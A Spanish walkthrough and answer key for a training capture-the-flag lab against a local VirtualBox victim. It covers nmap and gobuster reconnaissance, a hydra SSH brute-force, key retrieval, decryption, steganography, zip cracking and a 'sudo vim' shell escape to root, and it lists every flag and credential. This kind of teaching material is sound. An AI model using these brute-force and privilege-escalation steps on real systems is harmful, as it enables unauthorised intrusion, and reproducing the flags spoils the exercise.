# CYBERQUEST «Skynet :: Nodo 07» — Guía completa paso a paso

> Guía para cualquier persona, sin conocimientos previos. Todo se hace en la
> **máquina atacante (Kali)**. La víctima **no se toca**: solo se lee por red
> (web y SSH).
>
> ⚠️ **Lección aprendida**: la mayor parte de los fallos vienen de (1) no tener
> instaladas las herramientas en la Kali o (2) no haber descargado antes los
> archivos de la página de la víctima. Esta guía lo deja **explícito** en cada
> paso con listas de comprobación.

---

## 0. Cómo funciona la actividad (léelo primero)

- Hay **dos máquinas virtuales**:
  - **Víctima `Skynet-Nodo07`** → `10.10.10.7`. Es el objetivo ("la intranet").
  - **Atacante `kali_ciber_david`** → `10.10.10.2`. Es TU máquina de trabajo.
- Ambas están en una red interna privada (`10.10.10.0/24`) de VirtualBox.
- El atacante **no puede** escribir ni instalar nada en la víctima. La lee por
  red: su web (`http://10.10.10.7`) y su SSH (`ssh ...@10.10.10.7`).
- Los comandos se escriben **siempre en la Kali**, en una terminal (ventana
  negra).
- La consola/pantalla de la víctima **no se usa nunca** (no tiene login por
  teclado; es normal que "no deje escribir"). ¡Nada de mirar su pantalla!

### MAPA de la guía (resumen mental)

| Me preparo | Me descargo de la víctima | Lo genero yo |
|---|---|---|
| Herramientas instaladas (paso 1) | `captura_terminador.jpg` | `palabras.txt` (con cewl) |
| `resistance_steg.py`, `rsa_tool.py`, `dir.txt` | `bandera_nodo.zip` | `bandera.jpg` (al descomprimir) |
| — | `nucleo.conf`, `nucleo.conf.enc`, `ruido.enc` | `orden.txt` (al descifrar) |
| — | `llave_privada.txt` (por scp/SSH) | — |

---

## 1. Preparar la MÁQUINA ATACANTE (Kali): instalar todo (solo la primera vez)

> La Kali **no trae todo por defecto**. Si una herramienta falta, el comando
> falla con "command not found". Haz este paso completo ANTES de empezar.

1. Abre una **terminal** en la Kali (icono de ventana negra).
2. Comprueba qué tienes instalado:

   ```bash
   which nmap gobuster exiftool cewl hydra wget curl unzip 7z openssl python3
   ```

3. **Instala lo que falte** (pide tu contraseña de Kali). Aunque parece que
   todo está, ejecuta el apt igualmente para asegurar:

   ```bash
   sudo apt update
   sudo apt install -y nmap gobuster libimage-exiftool-perl cewl hydra p7zip-full curl wget openssl python3 unzip
   ```

4. Verifica de nuevo que todos los programas están listos (los 12 deben salir
   en pantalla):

   ```bash
   which nmap gobuster exiftool cewl hydra wget curl unzip 7z openssl python3
   ```

> **Herramientas propias del reto** (`resistance_steg.py`, `rsa_tool.py`,
> `dir.txt`): se descargan en el paso 3 desde GitHub, no vienen con la Kali.

---

## 2. Arrancar el laboratorio (en Windows)

1. Enciende las dos máquinas:
   ```powershell
   VBoxManage startvm "kali_ciber_david"
   VBoxManage startvm Skynet-Nodo07
   ```
2. Espera 2-3 minutos (arranque completo).
3. Abre la ventana de la Kali y entra con tu usuario/contraseña de Kali.
4. Comprueba que la Kali alcanza a la víctima:
   ```bash
   ping -c 3 10.10.10.7
   ```
   → Debe responder. Si no responde, revisa el **Anexo B**.

> Truco VirtualBox: haz clic dentro de la ventana de la VM para capturar el
> teclado; suelta el ratón con **Ctrl derecho**.

---

## 3. Carpeta de trabajo y herramientas del reto

1. Crea la carpeta y entra:
   ```bash
   mkdir skynet-tools
   cd skynet-tools
   ```
   > Este será TU sitio de trabajo. **Todos los archivos descargados se guardan
   > aquí.** En cada terminal nueva, ejecuta primero `cd skynet-tools`.

2. Descarga las 3 herramientas del reto (desde GitHub, necesitan internet):
   ```bash
   wget https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/resistance_steg.py
   wget https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/rsa_tool.py
   wget https://raw.githubusercontent.com/DAVIDCHIAC/Skynet-Ciber/master/tools/dir.txt
   ```
3. Lista de comprobación:
   ```bash
   ls
   ```
   ✓ Debe mostrar `dir.txt  resistance_steg.py  rsa_tool.py`

---

## 4. DESCARGAR DE LA VÍCTIMA lo necesario (bloque de descargas)

> **IMPORTANTE (es la causa nº1 de error)**: la víctima guarda las fotos, el
> zip y los cifrados **en su página web**. Nada de eso está en tu Kali: hay que
> **descargarlo**. Estas descargas se hacen con `wget` desde tu Kali y la URL
> siempre empieza por **`http://`** (jamás `https://`).

Ejecuta todo este bloque (desde `~/skynet-tools`):

```bash
cd skynet-tools
wget http://10.10.10.7/archivo/evidencias/captura_terminador.jpg
wget http://10.10.10.7/archivo/evidencias/bandera_nodo.zip
wget http://10.10.10.7/archivo/pcap/red_skynet.pcap
wget http://10.10.10.7/nucleo/nucleo.conf
wget http://10.10.10.7/nucleo/nucleo.conf.enc
wget http://10.10.10.7/nucleo/ruido.enc
```

Lista de comprobación (deben estar los 6 ficheros):

```bash
ls
```
✓ Debe mostrar: `bandera_nodo.zip  captura_terminador.jpg  dir.txt
nucleo.conf  nucleo.conf.enc  red_skynet.pcap  resistance_steg.py
rsa_tool.py  ruido.enc`

> El fichero `llave_privada.txt` **no se descarga con wget**: está dentro del
> SSH (paso 8) y se trae con `scp` (paso 10).

---

## 5. Misión P1 · Reconocimiento (ver qué servicios tiene la víctima)

`nmap` escanea los servicios (puertos) abiertos de la víctima:

```bash
nmap -sV -sC 10.10.10.7
```

→ Espera:
- `22/tcp` → SSH (entrada por terminal remota).
- `80/tcp` → HTTP (servidor web de la intranet).

---

## 6. Misión P2 · Descubrir páginas ocultas (gobuster)

El servidor web no lista archivos. `gobuster` adivina nombres de páginas con
la wordlist `dir.txt` (ya descargada en el paso 3):

```bash
gobuster dir -u http://10.10.10.7 -w dir.txt
```

→ Aparecen rutas como `/robots.txt`, `/personal.html`, `/archivo/`,
`/nucleo/`, `/admin/`.

> Regla de oro: todas las URLs del reto empiezan con **`http://`** (nunca
> `https://`). Si algo "no conecta" o se agota el tiempo en el puerto 443, es
> porque se te coló una "s".

---

## 7. Misión P3 · La bandera del robots.txt (F2)

(Lee la página; no requiere descarga previa.)

```bash
curl -s http://10.10.10.7/robots.txt
```

→ Espera: `Fragmento_2=NucleoRojo{RU5DSUEgVEk}`

**Anota: F2 = `NucleoRojo{RU5DSUEgVEk}`**

---

## 8. Misión P4 · Ingeniería social (leer la intranet)

```bash
curl -s http://10.10.10.7/personal.html
curl -s http://10.10.10.7/admin/
```

→ `personal.html`: perfil de **Miles Dyson** y la empresa **Cyberdyne**.
→ `admin/`: usuario **`dyson_m`** y pista de que la clave SSH es el nombre de
la compañía (**Cyberdyne**).

---

## 9. Misión P5 · Crear diccionario y descubrir la contraseña SSH

> `palabras.txt` **NO se descarga ni existe en ningún sitio**: se **genera**
> ahora con `cewl`.

1. Genera el diccionario con las palabras de la web de la víctima:
   ```bash
   cewl http://10.10.10.7 -m 5 -d 2 -w palabras.txt
   ```
2. Comprueba que contiene la palabra clave:
   ```bash
   grep -i cyberdyne palabras.txt
   ```
   Si no aparece, añádela a mano:
   ```bash
   echo Cyberdyne >> palabras.txt
   ```
3. Fuerza bruta del SSH (usa el diccionario `palabras.txt`):
   ```bash
   hydra -l dyson_m -P palabras.txt ssh://10.10.10.7 -t 4
   ```
   → Espera: `[22][ssh] host: 10.10.10.7  login: dyson_m  password: Cyberdyne`

**Credenciales SSH: `dyson_m` / `Cyberdyne`**

---

## 10. Misión P6 · Entrar por SSH

```bash
ssh dyson_m@10.10.10.7
```
- Contraseña: `Cyberdyne` (no se ve al escribir).
- Si pregunta "continue connecting? (yes/no)" → escribe `yes`.
- Sólo el usuario `dyson_m` puede entrar (los demás denegados).

Explora el interior y anota lo que hay:
```bash
ls
ls nucleo/
cat bastion/pista1.txt
cat Documentos/pista2.txt
```
→ Dentro de `nucleo/` está **`llave_privada.txt`**. NO la pongas en la web:
se trae con `scp` (paso 11).

Sal de la sesión:
```bash
logout
```

---

## 11. Misión M3 · Criptografía (F3 + ORDEN) — con descargas vía scp

**Necesitas tener descargado (paso 4):** `nucleo.conf`, `nucleo.conf.enc`,
`ruido.enc`.

1. Trae la llave privada desde el SSH a tu Kali (**no** con wget; con `scp`):
   ```bash
   scp dyson_m@10.10.10.7:~/nucleo/llave_privada.txt .
   ```
   ⚠️ No olvides el **punto final** (`.` = carpeta actual). Si lo olvidas, `scp`
   te muestra su menú de ayuda vacío.
   ✓ Comprueba: `ls -la llave_privada.txt`

2. Recupera la clave de sesión (RSA) con la herramienta del reto:
   ```bash
   python3 rsa_tool.py llave_privada.txt nucleo.conf nucleo.conf.enc
   ```
   → Espera: **`S3kiRa-07`**

3. Descifra el "ruido" con esa clave (AES-256-CBC):
   ```bash
   openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -pass pass:S3kiRa-07 -in ruido.enc -out orden.txt
   cat orden.txt
   ```
   → Espera: `FRAGMENTO_3=NucleoRojo{RU5FIE1VQ0hP}` y una cadena base64.

   **Anota: F3 = `NucleoRojo{RU5FIE1VQ0hP}`**

4. Decodifica la cadena **dos veces** con base64:
   ```bash
   echo "Uld3Z1lYUmhjWFZsSUdWeklHRWdiR0Z6SURRNk1EQT0=" | base64 -d | base64 -d
   ```
   → **`El ataque es a las 4:00`** = la **ORDEN NUCLEAR**.

---

## 12. Misión M1 · Esteganografía y metadatos (F1)

**Necesitas tener descargado (paso 4):** `captura_terminador.jpg`.

1. La bandera está en los metadatos EXIF de la foto (no en "Comment", sino en
   el campo **`Image Description`**):
   ```bash
   exiftool captura_terminador.jpg | grep -i description
   ```
   → Espera: `Image Description : NucleoRojo{TEEgUkVTSVNU}`

   **Anota: F1 = `NucleoRojo{TEEgUkVTSVNU}`**

2. La foto oculta además un mensaje (esteganografía DCT). Extráelo:
   ```bash
   python3 resistance_steg.py captura_terminador.jpg
   ```
   → Espera: transmisión del analista «OJODEDIOS» + la pregunta *¿Cuál es el
   nombre de la persona que está al lado del Terminator?*

> Ayuda: en Terminator 2 la persona que camina junto al T-800 es **John
> Connor**. Esa es la contraseña del ARCA.

---

## 13. Misión M4 · Abrir el ARCA (zip cifrado) → F4

**Necesitas tener descargado (paso 4):** `bandera_nodo.zip`.

1. El zip está cifrado con **AES (método 99)** y `unzip` GNU no lo soporta
   (sale "unsupported compression method 99"). Usa **7-Zip**:
   ```bash
   7z x -p"John Connor" bandera_nodo.zip
   ```
2. Extrae (lista si hace falta): `bandera.jpg` y `pista4.txt`.
3. La bandera está en el EXIF de `bandera.jpg`:
   ```bash
   exiftool bandera.jpg | grep -i description
   ```
   → Espera: `NucleoRojo{UyBST1NUUk9T}`

   **Anota: F4 = `NucleoRojo{UyBST1NUUk9T}`**

4. Lee la pista de escalada:
   ```bash
   cat pista4.txt
   ```

---

## 14. Misión M5 · Escalada a root → F5

1. Entra por SSH:
   ```bash
   ssh dyson_m@10.10.10.7
   ```
2. Mira qué puedes ejecutar como administrador sin contraseña:
   ```bash
   sudo -l
   ```
   → Espera: `(root) NOPASSWD: /usr/bin/vim, /usr/bin/vi`
3. `vim` permite abrir una terminal (escape del editor):
   ```bash
   sudo vim -c ':!/bin/bash'
   ```
   → Quedas con una consola de **root**.
4. Lee la última bandera:
   ```bash
   cat /root/nucleo/FLAG5.txt
   ```
   → Espera: `NucleoRojo{XzAxMTA}`

   **Anota: F5 = `NucleoRojo{XzAxMTA}`**

---

## 15. Misión final · Validar el núcleo

```bash
sudo /root/nucleo/nucleo.sh
```
Pega los 5 fragmentos en orden (cada uno + Enter), formato `NucleoRojo{...}`,
y después la ORDEN:

```
NucleoRojo{TEEgUkVTSVNU}
NucleoRojo{RU5DSUEgVEk}
NucleoRojo{RU5FIE1VQ0hP}
NucleoRojo{UyBST1NUUk9T}
NucleoRojo{XzAxMTA}
El ataque es a las 4:00
```

→ Espera:
```
FRASE RECONSTRUIDA (ADN): LA RESISTENCIA TIENE MUCHOS ROSTROS_0110
>>> NUCLEO VERIFICADO CON EXITO <<<
```

¡Misión completada!

---

## Anexo A · Checklist maestro (marcar antes de la presentación)

**Instalado en la Kali (paso 1):**
- [ ] nmap · gobuster · exiftool · cewl · hydra
- [ ] wget · curl · unzip · 7z · openssl · python3

**Descargadas en `~/skynet-tools`:**
- [ ] `resistance_steg.py` · `rsa_tool.py` · `dir.txt` (paso 3)
- [ ] `captura_terminador.jpg` · `bandera_nodo.zip` (paso 4)
- [ ] `nucleo.conf` · `nucleo.conf.enc` · `ruido.enc` (paso 4)
- [ ] `llave_privada.txt` (paso 11, vía scp)

## Anexo B · Datos de referencia (para imprimir)

| Dato | Valor |
|---|---|
| Web víctima | `http://10.10.10.7` |
| SSH | `dyson_m` / `Cyberdyne` |
| Password del ARCA (zip) | `John Connor` |
| Clave de sesión (RSA) | `S3kiRa-07` |
| ORDEN NUCLEAR | `El ataque es a las 4:00` |
| F1 | `NucleoRojo{TEEgUkVTSVNU}` |
| F2 | `NucleoRojo{RU5DSUEgVEk}` |
| F3 | `NucleoRojo{RU5FIE1VQ0hP}` |
| F4 | `NucleoRojo{UyBST1NUUk9T}` |
| F5 | `NucleoRojo{XzAxMTA}` |
| ADN | `LA RESISTENCIA TIENE MUCHOS ROSTROS_0110` |
| Escalada | `sudo vim -c ':!/bin/bash'` |

## Anexo C · Problemas frecuentes (y su arreglo)

| Síntoma | Causa | Solución |
|---|---|---|
| `command not found` | Falta instalar la herramienta | Paso 1: `sudo apt install -y ...` (revisar la lista) |
| No responde 10.10.10.7 | Víctima apagada o a medio arrancar | `VBoxManage startvm Skynet-Nodo07`; esperar 2-3 min |
| La Kali no hace ping | Kali sin IP 10.10.10.x | `sudo dhclient enp0s8` (o mirar `ip a`) |
| `unsupported protocol scheme` | URL mal escrita (falta `://`) | Usar `http://10.10.10.7` exacto |
| `wget` se agota en `:443` | Se usó `https://` (puerto 443) | Cambiar a `http://` |
| `File not found ...jpg` | No se descargó la imagen (paso 4) | `wget http://10.10.10.7/archivo/evidencias/captura_terminador.jpg` |
| `unzip` "compression method 99" | Zip cifrado AES | Usar `7z x -p"John Connor" bandera_nodo.zip` |
| exiftool no muestra "comment" | La bandera está en "Image Description" | `grep -i description` |
| `palabras.txt no existe` | Aún no se generó | Ejecutar primero `cewl ... -w palabras.txt` |
| `scp` muestra su menú "usage" | Falta el destino (el punto final) | `scp ... .  ` (un espacio y un punto al final) |
| `rsa_tool.py` "No such file" | No estás en `~/skynet-tools` | `cd skynet-tools` y repetir |
| No "deja escribir" en la víctima | Es normal (sin login de teclado) | No usar esa consola; entrar por SSH desde la Kali |